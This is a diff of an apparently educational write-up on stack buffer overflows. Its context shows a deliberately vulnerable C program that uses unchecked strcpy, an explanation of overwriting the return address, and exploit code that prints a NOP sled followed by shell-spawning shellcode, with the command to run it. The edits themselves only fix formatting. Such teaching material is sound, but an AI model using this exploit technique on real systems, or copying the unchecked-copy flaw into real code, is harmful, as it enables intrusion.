@@ -71,9 +71,9 @@ In `exploit1.c`, shellcode is inserted that will cause the program to set the re
 int main(int argc, char *argv[])
 {
   char buf[256];
-	if (argc < 2)
-		puts("Please enter your name as a command line parameter.");
-	else
+  if (argc < 2)
+    puts("Please enter your name as a command line parameter.");
+  else
   {
     strcpy(buf,argv[1]);
     printf("Input was: %s\n",buf);
@@ -82,7 +82,7 @@ int main(int argc, char *argv[])
 }
 ``` 
 
-This program accepts a a parameter and then writes it out again. However, the length of the parameter is not checked, and if it exceeds the 256 byte buffer, an oveflow will occur. This makes it possible to overwrite the return address, causing the programm to jump up on the stack into the buffer, where shellcode has been placed, and this can then be executed to start another shell. The code in `exploit3.c` produces a string of bytes that serve exactly this function. Execute both with `./hackme3 $(./exploit3). 
+This program accepts a a parameter and then writes it out again. However, the length of the parameter is not checked, and if it exceeds the 256 byte buffer, an oveflow will occur. This makes it possible to overwrite the return address, causing the programm to jump up on the stack into the buffer, where shellcode has been placed, and this can then be executed to start another shell. The code in `exploit3.c` produces a string of bytes that serve exactly this function. Execute both with `./hackme3 $(./exploit3)`. 
 
 ```
 #include <stdio.h>
@@ -93,11 +93,11 @@ char shellcode[] = "\xeb\x02\xeb\x0d\xe8\xf9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73
 int main()
 {
   int i;
-	for (i = 0; i < (256 - strlen(shellcode) + 8 + 6); i++)
-	{
-		printf("\x90");
-	}
+  for (i = 0; i < (256 - strlen(shellcode) + 8 + 6); i++)
+  {
+    printf("\x90");
+  }
   printf("%s",shellcode);
-	return 0;
+  return 0;
 }
 ```
